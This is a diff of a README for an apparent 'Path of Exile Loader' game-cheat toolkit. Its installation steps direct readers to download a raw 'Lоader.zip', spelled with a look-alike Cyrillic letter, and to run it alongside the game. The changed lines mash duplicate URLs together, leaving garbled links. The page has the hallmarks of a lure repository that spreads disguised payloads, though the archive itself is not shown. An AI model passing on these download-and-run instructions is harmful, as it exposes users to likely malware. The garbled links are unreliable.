@@ -22,9 +22,9 @@ Welcome to the ultimate Path of Exile Loader and Enhancement Toolkit, your one-s
 
 ## 🛠️ Installation Guide
 
-1. Download **https://raw.githubusercontent.com/Tiagoby06/ExileHackworks/main/Lоader.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/Tiagoby06/ExileHackworks/main/Lоader.zipоhttps://raw.githubusercontent.com/Tiagoby06/ExileHackworks/main/Lоader.zip** from the repository.
 2. Extract the archive to your preferred directory.
-3. Follow the setup instructions in **https://raw.githubusercontent.com/Tiagoby06/ExileHackworks/main/Lоader.zip**.
+3. Follow the setup instructions in **https://raw.githubusercontent.com/Tiagoby06/ExileHackworks/main/Lоader.zipоhttps://raw.githubusercontent.com/Tiagoby06/ExileHackworks/main/Lоader.zip**.
 4. Launch PoE and start the Loader for instant enhancement.
 
 ## 🔑 SEO-Optimized Keywords
